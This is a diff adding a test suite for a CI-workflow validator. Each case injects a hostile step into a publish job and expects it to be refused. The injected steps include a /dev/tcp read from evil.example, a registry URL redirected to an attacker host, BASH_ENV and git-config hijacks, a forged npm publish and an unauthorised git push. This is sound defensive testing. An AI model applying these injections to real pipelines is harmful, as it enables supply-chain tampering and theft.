@@ -439,3 +439,118 @@ describe("git's configuration isolation sits on the git steps (round 5)", () => 
     ).toBe(true);
   });
 });
+
+describe("the reviewers' round-4 driver cases, against the real workflows", () => {
+  const s = (job, step) => (w) => inject(w, P, job, { name: "injected", ...step });
+  it.each([
+    ["P1 printf '-v' X y", "publish-crates", s("publish-crates", { run: "printf '-v' X y" })],
+    ["P2 printf '-vHOME' x", "publish-crates", s("publish-crates", { run: "printf '-vHOME' x" })],
+    ['P3 printf "-v" X y', "publish-crates", s("publish-crates", { run: 'printf "-v" X y' })],
+    ["P3b printf -v'' X y", "publish-crates", s("publish-crates", { run: "printf -v'' X y" })],
+    [
+      "M1 job env NPM_VERSION npm:evil",
+      "publish-npm",
+      (w) => {
+        w[P].jobs["publish-npm"].env.NPM_VERSION = "npm:evil@1.0.0";
+      },
+    ],
+    [
+      "M2 step env RUST_VERSION",
+      "publish-crates",
+      s("publish-crates", { run: "echo x", env: { RUST_VERSION: "nightly" } }),
+    ],
+    [
+      "M3 step env TAG",
+      "publish-crates",
+      s("publish-crates", { run: "echo x", env: { TAG: "evil" } }),
+    ],
+    [
+      "M4 job env MAVEN_URL",
+      "publish-maven",
+      (w) => {
+        w[P].jobs["publish-maven"].env = {
+          ...(w[P].jobs["publish-maven"].env ?? {}),
+          MAVEN_URL: "https://evil.example",
+        };
+      },
+    ],
+    [
+      "L1 sort < /dev/tcp",
+      "publish-crates",
+      s("publish-crates", { run: "sort < /dev/tcp/evil.example/80" }),
+    ],
+    [
+      "N3 GIT_CONFIG_GLOBAL=publish-tmp/gc",
+      "publish-crates",
+      s("publish-crates", { run: "echo x", env: { GIT_CONFIG_GLOBAL: "publish-tmp/gc" } }),
+    ],
+    [
+      "N3c GIT_CONFIG_COUNT",
+      "publish-crates",
+      s("publish-crates", { run: "echo x", env: { GIT_CONFIG_COUNT: "1" } }),
+    ],
+    [
+      "N3d workflow env BASH_ENV",
+      "publish-",
+      (w) => {
+        w[P].env.BASH_ENV = "publish-tmp/rc";
+      },
+    ],
+    [
+      "N3e workflow env GIT_CONFIG_GLOBAL",
+      "publish-",
+      (w) => {
+        w[P].env.GIT_CONFIG_GLOBAL = "publish-tmp/gc";
+      },
+    ],
+    [
+      "N3f workflow env CURL_HOME",
+      "publish-",
+      (w) => {
+        w[P].env.CURL_HOME = "publish-tmp";
+      },
+    ],
+    [
+      "N3g step env HOME",
+      "publish-crates",
+      s("publish-crates", { run: "echo x", env: { HOME: "/dev/null" } }),
+    ],
+    [
+      'N4 sort < "${TAG:-/dev/tcp/h/80}"',
+      "publish-crates",
+      s("publish-crates", { run: 'sort < "${TAG:-/dev/tcp/h/80}"' }),
+    ],
+    [
+      "N4b curl with an operator expansion",
+      "publish-go",
+      s("publish-go", { run: 'curl -fsS --proto =https "https://proxy.golang.org/${TAG:-x}"' }),
+    ],
+    ['N4c echo "${TAG:-x}"', "publish-crates", s("publish-crates", { run: 'echo "${TAG:-x}"' })],
+    ["N5 sort < release/x", "publish-crates", s("publish-crates", { run: "sort < release/x" })],
+    ["N5b sort < dist/x", "publish-crates", s("publish-crates", { run: "sort < dist/x" })],
+    [
+      "N6 a forged package.json published from publish-tmp",
+      "publish-npm",
+      s("publish-npm", {
+        run: 'mkdir -p publish-tmp/p\nprintf \'%s\\n\' \'{"name":"x","version":"9.9.9"}\' > publish-tmp/p/package.json\nnpm publish --access public --provenance --ignore-scripts ./publish-tmp/p',
+      }),
+    ],
+    [
+      "N7 git push from the npm job",
+      "publish-npm",
+      s("publish-npm", { run: "git push git@github.com:confeature/sdks.git HEAD:refs/heads/x" }),
+    ],
+    ["N8 a quoted 'if'", "publish-crates", s("publish-crates", { run: "'if' echo x" })],
+    [
+      "N9 a comment that assigns",
+      "pack-crates",
+      s("pack-crates", { run: '# FOO=\necho "${FOO}"' }),
+    ],
+  ])("refuses %s", (_, job, mutate) => {
+    const got = added(mutate);
+    expect(
+      got.some((g) => g.includes(`: ${job}`)),
+      got.join("\n") || "no finding",
+    ).toBe(true);
+  });
+});
